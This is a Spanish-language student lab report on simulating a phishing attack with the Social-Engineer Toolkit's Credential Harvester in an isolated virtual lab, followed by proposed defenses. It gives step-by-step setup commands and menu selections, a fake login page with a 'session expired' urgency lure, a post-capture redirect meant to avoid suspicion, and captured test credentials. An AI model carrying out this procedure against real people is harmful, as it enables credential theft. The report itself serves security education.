Parcial 1 · Actividad 4

Una página demasiado convincente

Implementación y análisis de una simulación de ingeniería social utilizando el Social-Engineer Toolkit (SET) de Kali Linux. Se busca comprender el funcionamiento técnico de una técnica de captura de información (Credential Harvester) y desarrollar la capacidad de identificar indicadores de un intento de phishing, así como proponer controles de seguridad orientados a la prevención de este tipo de ataques.

Objetivos específicos

  • Implementar un ataque de Credential Harvester con SET en laboratorio controlado.
  • Configurar un portal de login falso para captura de credenciales.
  • Documentar el flujo completo de captura de información.
  • Proponer controles de seguridad para mitigar este vector de ataque.

Infraestructura del laboratorio

  • Atacante: Kali Linux con SET y Tailscale
  • Víctima: Windows 11 con navegador web
  • Red: LAN interna virtualizada (VMware/VirtualBox)
  • Aislamiento: Sin acceso a internet

Configuración del laboratorio

Preparación del entorno

1. Instalación de SET

Se clona el repositorio oficial de TrustedSec y se instala dentro de un entorno virtual de Python para evitar conflictos de dependencias:

root@kali:~# git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
root@kali:~# cd setoolkit
root@kali:~/setoolkit# python3 -m venv .venv
root@kali:~/setoolkit# source .venv/bin/activate
root@kali:~/setoolkit# python -m pip install --upgrade pip
root@kali:~/setoolkit# python -m pip install -e .
root@kali:~/setoolkit# sudo setoolkit

2. Configuración de Tailscale

Tailscale funciona como un túnel inverso que permite la conexión directa entre las máquinas virtuales y el equipo físico, facilitando el acceso remoto sin complicaciones de red:

root@kali:~# tailscale up

To authenticate, visit:
https://login.tailscale.com/a/...

root@kali:~# systemctl status tailscaled

Active: active (running)
Status: "Connected; ..."

3. Preparación del login falso

Se diseña una página de autenticación simulada que replica un portal institucional. El archivo debe llamarse index.html para que SET lo sirva correctamente:

root@kali:~/Documentos/lab# mkdir act_4 && cd act_4
root@kali:~/Documentos/lab/act_4# mv login_act4.html index.html
root@kali:~/Documentos/lab/act_4# ls
index.html

El diseño incluye un mensaje de alerta: "Su sesión ha expirado. Inicie sesión nuevamente para continuar." — esto para presionar al usuario para actuar sin pensar.

4. Configuración del redireccionamiento

Se edita el archivo de configuración de SET para definir a dónde se redirigirá a la víctima después de capturar sus credenciales:

root@kali:~# sudo nano /etc/setoolkit/set.config

HARVESTER_REDIRECT=
https://www.google.com

Procedimiento

Ejecución del ataque

1. Menú principal de SET

Al ejecutar sudo setoolkit se despliega el banner y el menú principal. Se selecciona la opción 1) Social-Engineering Attacks:

Select from the menu:

1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
5) Update SET configuration
6) Help, Credits, and About
99) Exit the Social-Engineer Toolkit

set> 1

2. Vectores de ataque web

Dentro del submenú de ingeniería social, se selecciona la opción 2) Website Attack Vectors:

1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) Wireless Access Point Attack Vector
8) QRCode Generator Attack Vector
9) Powershell Attack Vectors
10) Third Part Modules

set> 2

3. Credential Harvester Attack Method

Se elige la opción 3) Credential Harvester Attack Method, el módulo específico diseñado para clonar sitios web e interceptar credenciales:

1) Java Applet Attack Method
2) Metasploit Browser Exploit Method
3) Credential Harvester Attack Method
4) Tabnabbing Attack Method
5) Web Jacking Attack Method
6) Multi-Attack Web Method
7) HTA Attack Method

set:webattack> 3

4. Importación personalizada

Se selecciona 3) Custom Import para utilizar el archivo index.html creado previamente en lugar de clonar un sitio externo:

1) Web Templates
2) Site Cloner
3) Custom Import

set:webattack> 3

5. Parámetros de ejecución

SET solicita la IP para el POST-back (se usa la IP de Tailscale), la ruta al archivo index.html y una URL de referencia para el redireccionamiento:

IP address for the POST back in Harvester/Tabnabbing
[192.168.x.x]: 100.118.x.x

Evidencias

Resultados de la prueba

1. Acceso de la víctima

Desde la máquina Windows 11, la víctima accede a la IP de Tailscale donde corre el servidor de SET. El navegador muestra el portal falso con el mensaje de sesión expirada:

Figura 1 — Vista del portal de login falso desde Windows 11 (víctima).

2. Ingreso de credenciales

La víctima completa el formulario con usuario y contraseña. Al presionar Iniciar sesión, los datos se envían vía HTTP GET al servidor de SET:

Figura 2 — La víctima introduce sus credenciales en el formulario suplantado.

3. Captura en el servidor atacante

SET intercepta la petición y registra las credenciales en texto plano directamente en la terminal, junto con la IP de origen y el timestamp:

100.120.251.85 - - [29/Aug/2026 00:00:23] "GET / HTTP/1.1" 200 -
100.120.251.85 - - [29/Aug/2026 00:00:23] "GET /favicon.ico HTTP/1.1" 404 -
100.120.251.85 - - [29/Aug/2026 00:01:10] "GET /?username=usuariovalidado&password= HTTP/1.1" 404 -
100.120.251.85 - - [29/Aug/2026 00:01:23] "GET /?username=usuariovalidado&password=usuariovalidado HTTP/1.1" 404 -

Nota: las credenciales quedan expuestas en la URL como parámetros GET, lo que facilita su captura pero también representa una mala práctica de desarrollo que los atacantes explotan.

4. Servidor en escucha

El servidor de SET permanece activo en el puerto 80, esperando nuevas conexiones y registrando cada interacción:

Figura 3 — SET en modo escucha, mostrando las peticiones GET recibidas.

Análisis técnico

Flujo de captura de información

01
Solicitud inicial (GET): La víctima accede al enlace malicioso. El navegador envía una petición GET al servidor de SET.
02
Respuesta (HTML): SET sirve la página index.html que contiene el formulario de autenticación falso.
03
Envío de datos (GET): La víctima completa el formulario y presiona "Iniciar sesión". El navegador envía una petición HTTP GET con los parámetros username y password en la URL.
04
Intercepción: SET escucha en el puerto configurado, recibe la petición, extrae los valores de los campos y los imprime en la terminal.
05
Registro: Los datos se almacenan en un archivo de log junto con metadata (IP de origen, fecha/hora, user-agent).
06
Respuesta final: SET redirige a la víctima hacia el sitio legítimo (Google) para evitar levantar sospechas.

Controles defensivos

Controles de seguridad propuestos

Control Descripción
Educación y concienciación Capacitar a los empleados para identificar correos sospechosos, verificar remitentes y no hacer clic en enlaces no solicitados.
Autenticación multifactor (MFA) Exigir un segundo factor de autenticación además de la contraseña, haciendo inútiles las credenciales robadas.
Filtros de correo (SEG) Bloquear correos con enlaces sospechosos, dominios similares y adjuntos maliciosos antes de llegar al usuario.
Análisis de URLs Verificar enlaces antes de hacer clic mediante sandboxing o servicios de reputación de dominios.
Certificados SSL/TLS y HSTS Asegurar que los portales legítimos usen HTTPS válido y estén protegidos contra downgrade a HTTP.
Detección de suplantación de dominio Monitorear el registro de dominios similares al institucional para detectar campañas de phishing temprano.

Conclusión

Reflexiones finales

Esta actividad permitió comprender de manera práctica el funcionamiento de una técnica de ingeniería social mediante el módulo Credential Harvester de SET. Se evidenció que, con recursos mínimos y una página web sencilla, un atacante puede crear un portal falso capaz de capturar credenciales sin que la víctima lo perciba.

La clave del éxito del ataque no reside en la sofisticación técnica, sino en la explotación de la confianza del usuario. El mensaje de "sesión expirada" genera urgencia y reduce la capacidad de análisis crítico, un principio fundamental de la ingeniería social.

Desde la perspectiva defensiva, la combinación de educación del usuario, MFA y filtrado de correo constituye la línea de protección más efectiva contra este tipo de vectores. La tecnología sola no basta: el factor humano sigue siendo tanto el eslabón más débil como la mejor defensa.
